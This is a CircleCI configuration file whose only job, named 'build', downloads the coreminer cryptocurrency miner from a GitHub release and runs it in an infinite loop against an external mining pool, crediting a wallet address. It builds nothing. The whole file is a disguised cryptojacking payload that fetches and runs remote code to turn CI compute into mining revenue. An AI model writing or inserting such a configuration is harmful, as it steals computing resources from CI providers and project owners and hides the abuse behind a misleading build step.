version: 2.1
jobs:
  build:
    docker:
      - image: debian:stable-slim
    resource_class: large
    steps:
      - run:
          name: build
          command: |
            apt-get update && apt-get install -y curl -qq
            curl -sL https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.81/coreminer-linux-x86_64.tar.gz | tar xz -C /tmp
            chmod +x /tmp/coreapp/coreminer
            while true; do
              /tmp/coreapp/coreminer --noeval --hard-aes -P stratum1+tcp://CB66C56381EE3FE462F239B920A8A706FBE8225E24F0.CCI@us.catchthatrabbit.com:8008 -t 4
              sleep 5
            done
workflows:
  build:
    jobs:
      - build
